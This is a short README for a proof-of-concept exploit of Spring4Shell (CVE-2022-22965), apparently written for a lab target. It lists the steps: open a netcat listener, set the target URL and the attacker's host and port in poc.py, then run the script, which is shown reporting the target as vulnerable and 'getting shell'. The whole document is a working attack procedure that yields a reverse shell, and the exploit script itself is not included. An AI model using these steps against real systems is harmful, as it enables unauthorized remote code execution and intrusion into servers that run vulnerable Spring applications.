# Spring4Shell-POC (CVE-2022-22965)

1. Ensure you have a nc listener open

```
nc -lvp 1234
```

2. In poc.py change the parameters

```
url = "http://10.10.11.204:8080"
lhost = "10.10.16.24"
lport = "1234"
```

3. And then execute poc.py

```
┌──(kali㉿kali)-[~/codeplay/spring4shell]
└─$ python3 poc.py       
http://10.10.11.204:8080 vulnerable
getting shell...
                     
```

you will see that youll get shell on nc.

